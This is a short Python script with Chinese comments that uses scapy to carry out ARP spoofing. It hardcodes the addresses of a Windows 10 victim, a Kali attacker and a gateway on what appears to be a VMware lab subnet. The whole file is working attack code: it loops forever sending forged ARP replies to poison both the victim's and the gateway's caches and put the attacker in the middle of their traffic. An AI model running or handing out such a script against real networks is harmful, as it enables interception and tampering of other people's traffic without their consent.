'''
win10: ip:192.168.161.139  mac: 00:0c:29:80:0E:EC
kail" ip:192.168.161.135  mac: 00:0c:29:55:21:8a
wangguan ip:192.168.161.2 mac:00:50:56:f8:57:87
'''

'''
该函数用于实现arp欺骗，被欺骗者是win10还有网关
攻击者是kail

'''
from scapy.all import *
from scapy.layers.l2 import Ether, ARP
import time


def arpqipian():
    while True:
        win10ip="192.168.161.139"
        win10mac="00:0c:29:80:0E:EC"

        kailip="192.168.161.135"
        kailmac="00:0c:29:55:21:8a"

        wangguanip="192.168.161.2"
        wangguanmac="00:50:56:f8:57:87"


        dataforwin=Ether(src=kailmac,dst=win10mac)/ARP(hwsrc=kailmac,psrc=wangguanip,hwdst=win10mac,pdst=win10ip,op=2)

        dataforwanguan=Ether(src=kailmac,dst=wangguanmac)/ARP(hwsrc=kailmac,psrc=win10ip,hwdst=wangguanmac,pdst=wangguanip,op=2)

        wangka="VMware Network Adapter VMnet8"
        try:
            sendp(dataforwin,iface=wangka)
            sendp(dataforwanguan,iface=wangka)

            time.sleep(1)
        except:
            pass

if __name__ == '__main__':
    arpqipian()